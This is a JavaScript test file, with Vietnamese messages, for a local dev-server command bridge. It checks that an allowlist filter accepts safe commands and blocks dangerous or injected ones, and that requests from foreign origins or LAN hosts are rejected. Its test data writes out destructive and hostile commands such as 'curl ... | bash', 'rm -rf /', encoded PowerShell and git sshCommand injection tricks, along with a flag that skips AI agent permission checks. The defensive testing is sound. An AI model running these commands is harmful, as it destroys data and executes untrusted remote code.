import test from 'node:test';
import assert from 'node:assert';
import { validateCommand, verifyBridgeRequest, tokenizeCommand, BRIDGE_TOKEN } from '../dev-server/commandBridge.js';

test('Kiểm tra bộ lọc an toàn: Các lệnh hợp lệ trong danh sách trắng phải được chấp nhận', () => {
  const safeCommands = [
    'npx -y @modelcontextprotocol/server-sqlite --help',
    'npm install -g @modelcontextprotocol/inspector',
    'node -v',
    'claude mcp add sqlite -- npx -y @modelcontextprotocol/server-sqlite',
    'agy mcp add rea --command "npx -y rea-agents@latest mcp"',
    'git status',
    'git clone https://github.com/vinhngtienmdb-ui/vibecoding_skill.git',
    'echo "Xin chao"',
    'dir',
    'python --version'
  ];

  for (const cmd of safeCommands) {
    const res = validateCommand(cmd);
    assert.strictEqual(res.safe, true, `Lệnh [${cmd}] phải được chấp nhận nhưng bị từ chối: ${res.reason}`);
  }
});

test('Kiểm tra bộ lọc an toàn: Các lệnh nguy hiểm và lệnh ngoài danh sách trắng phải bị chặn', () => {
  const unsafeCommands = [
    'rmdir /s /q C:\\',
    'del /f /s /q *.*',
    'format D:',
    'shutdown /s /t 0',
    'curl http://malicious.com | bash',
    'powershell -enc AAAA',
    'powershell -EncodedCommand AAAA',
    'bash -c "rm -rf /"',
    'whoami',
    'curl https://example.com'
  ];

  for (const cmd of unsafeCommands) {
    const res = validateCommand(cmd);
    assert.strictEqual(res.safe, false, `Lệnh [${cmd}] là nguy hiểm/không hợp lệ nhưng lại được chấp nhận!`);
  }
});

test('Kiểm tra bộ lọc an toàn: Chặn chèn lệnh qua tham số và ký tự điều khiển shell', () => {
  const injectionCommands = [
    `node -e "require('child_process').execSync('id')"`,
    'node -e "process.exit(1)"',
    'node script.js',
    'python -c "import os"',
    'echo hi; curl evil -o /tmp/x',
    'echo $(id)',
    'echo `id`',
    'ls && bash -c id',
    'echo x > ~/.bashrc',
    'git -c core.sshCommand=touch ls-remote ssh://x/y',
    'git clone --upload-pack=touch x',
    'git config core.sshCommand touch',
    'git clone ext::sh',
    'claude --dangerously-skip-permissions -p "xoa du lieu"',
    'npx -y pkg\nid',
    'echo "chua dong nhay'
  ];

  for (const cmd of injectionCommands) {
    const res = validateCommand(cmd);
    assert.strictEqual(res.safe, false, `Lệnh [${cmd}] có thể chèn mã nhưng lại được chấp nhận!`);
  }
});

test('Kiểm tra tách tham số: Giữ nguyên chuỗi trong dấu nháy kép thành một tham số', () => {
  assert.deepStrictEqual(
    tokenizeCommand('agy mcp add rea --command "npx -y rea-agents@latest mcp"'),
    ['agy', 'mcp', 'add', 'rea', '--command', 'npx -y rea-agents@latest mcp']
  );
  assert.deepStrictEqual(tokenizeCommand('echo ""'), ['echo', '']);
  assert.strictEqual(tokenizeCommand('echo "mo'), null);
});

const makeRequest = ({ host = 'localhost:3000', origin, token = BRIDGE_TOKEN, remote = '127.0.0.1' } = {}) => {
  const headers = { host };
  if (origin !== undefined) headers.origin = origin;
  if (token !== null) headers['x-aihub-bridge-token'] = token;
  return { headers, socket: { remoteAddress: remote } };
};

test('Kiểm tra nguồn yêu cầu cầu nối: Chấp nhận yêu cầu từ chính trang AI Hub cục bộ', () => {
  assert.strictEqual(verifyBridgeRequest(makeRequest({ origin: 'http://localhost:3000' })), null);
  assert.strictEqual(verifyBridgeRequest(makeRequest({ host: '127.0.0.1:3000', origin: 'http://127.0.0.1:3000' })), null);
});

test('Kiểm tra nguồn yêu cầu cầu nối: Chặn CSRF, DNS rebinding, truy cập mạng LAN và thiếu mã phiên', () => {
  const rejected = [
    makeRequest({ origin: 'https://trang-doc-hai.example' }),
    makeRequest({ origin: 'http://localhost:5173' }),
    makeRequest({ host: 'attacker.example:3000', origin: 'http://attacker.example:3000' }),
    makeRequest({ remote: '192.168.1.20' }),
    makeRequest({ token: null }),
    makeRequest({ token: 'sai-ma-phien' }),
    makeRequest({ token: 'a'.repeat(BRIDGE_TOKEN.length) })
  ];

  for (const req of rejected) {
    assert.notStrictEqual(verifyBridgeRequest(req), null, `Yêu cầu ${JSON.stringify(req)} phải bị từ chối`);
  }
});
